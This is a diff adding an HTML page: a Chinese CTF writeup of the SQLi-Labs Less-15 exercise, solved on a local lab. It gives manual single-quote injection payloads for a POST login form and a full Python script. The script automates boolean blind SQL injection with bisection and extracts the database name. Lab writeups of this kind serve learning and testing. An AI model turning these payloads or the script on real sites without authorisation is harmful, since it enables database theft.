@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-15 POST型布尔盲注与自动化脚本 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-15 POST型布尔盲注与自动化脚本 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.24 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, POST注入, 布尔盲注, Python</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-15 (POST - Blind - Boolian/time Based - Single quotes)</li>
+        <li><strong>提示：</strong>POST请求，盲注，单引号闭合</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    <p>本关卡为 POST 登录框。无数据回显，且屏蔽了 SQL 报错信息。只能通过页面状态判断条件真假：若查询成功回显 <code>flag.jpg</code>，失败则回显 <code>slap.jpg</code>。因此采用 <strong>布尔盲注（Boolean-based Blind SQLi）</strong>。</p>
+    <p>由于手工盲注效率低下，需编写 Python 脚本，利用二分法（Bisection）快速逼近目标字符的 ASCII 码。脚本需封装 <code>is_true()</code> 发送 POST 请求、<code>bisect()</code> 执行二分查找，并通过 <code>extract()</code> 先查长度、再逐字提取，实现自动化脱库。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：手工验证注入点</strong></p>
+    <p>在 Burp Suite 中抓取 POST 请求并测试闭合方式：</p>
+    <ul>
+        <li>输入 <code>uname=admin' AND 1=1 #&passwd=123&submit=Submit</code>，页面返回成功（包含 flag.jpg）。</li>
+        <li>输入 <code>uname=admin' AND 1=2 #&passwd=123&submit=Submit</code>，页面返回失败（包含 slap.jpg）。</li>
+    </ul>
+    <p><strong>解释与原理：</strong>确认存在单引号字符型注入，且可通过 <code>flag.jpg</code> 或 <code>slap.jpg</code> 进行 True/False 判定。</p>
+
+    <p><strong>第二步：编写自动化盲注脚本</strong></p>
+    <p>在 VS Code 中编写以下脚本并运行（需依赖 <code>requests</code> 库）：</p>
+
+<pre><code>import requests
+
+# 靶场地址
+url = "http://localhost/sqli-labs-master/Less-15/"
+# Less-15 成功页返回 ../images/flag.jpg，失败页返回 ../images/slap.jpg
+success_mark = "flag.jpg"
+
+def is_true(cond):
+    """把条件直接放进 WHERE，返回该条件在数据库里是否为真"""
+    data = {
+        "uname": f"admin' AND ({cond}) #",
+        "passwd": "123456",
+        "submit": "Submit",
+    }
+    response = requests.post(url, data=data, timeout=5)
+    return success_mark in response.text
+
+def bisect(expr, low, high):
+    """二分求出 expr 的值"""
+    while low &lt;= high:
+        mid = (low + high) // 2
+        if is_true(f"{expr}&gt;{mid}"):
+            low = mid + 1
+        else:
+            high = mid - 1
+    return low
+
+def extract(sql):
+    """先取长度，再逐字符二分"""
+    # 先查数据长度
+    n = bisect(f"length(({sql}))", 0, 64)
+    result = ""
+    # 根据长度循环查每个字符的 ASCII 码
+    for i in range(1, n + 1):
+        ascii_code = bisect(f"ascii(substr(({sql}),{i},1))", 32, 126)
+        char = chr(ascii_code)
+        result += char
+        print(f"[+] 发现第 {i}/{n} 个字符: {char}，当前结果为: {result}")
+    return result
+
+def main():
+    print("[*] 开始 POST 布尔盲注...")
+    # 提取当前数据库名
+    database_name = extract("select database()")
+    print(f"[*] 爆破完成，数据库名为: {database_name}")
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+    <p><strong>代码成分解析：</strong></p>
+    <ul>
+        <li><code>is_true(cond)</code>：将条件直接拼接到 <code>AND ({cond})</code> 中，发送 POST 请求，通过判断响应文本中是否包含 <code>flag.jpg</code> 返回布尔值。</li>
+        <li><code>bisect(expr, low, high)</code>：经典二分查找，不断将表达式与 <code>mid</code> 比较，快速收敛到确切的 ASCII 码或长度。</li>
+        <li><code>extract(sql)</code>：先查长度避免死循环，再按长度逐字提取，具有良好的通用性和容错性。</li>
+        <li><strong>核心坑点：</strong>不能用 <code>if(cond, 1, 2)</code>，因为在 WHERE 子句中非零值恒为真，会导致判定失效；必须直接将条件放入 WHERE 进行判断。</li>
+    </ul>
+
+    <p><strong>第三步：执行结果</strong></p>
+    <p>运行脚本，终端成功逐字打印出 <code>s</code>, <code>e</code>, <code>c</code>, <code>u</code>, <code>r</code>, <code>i</code>, <code>t</code>, <code>y</code>，最终输出数据库名 <code>security</code>。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>判定标志的选择：</strong>页面渲染出来的文字不一定在底层 HTML 源码中，因此以底层返回的图片文件名 <code>flag.jpg</code> 作为判定标志最为稳妥。</li>
+        <li><strong>盲注脚本的容错：</strong>加入 <code>timeout=5</code> 防止网络问题导致脚本卡死；先查长度再爆破，避免因固定循环范围导致数据截断或空跑。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>POST 布尔盲注：</strong>在没有回显和报错的情况下，通过构造布尔条件，根据页面状态差异推断数据。</li>
+        <li><strong>二分法自动化：</strong>利用 Python 封装请求与查找逻辑，将原本需要数万次的手工操作压缩至数百次。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
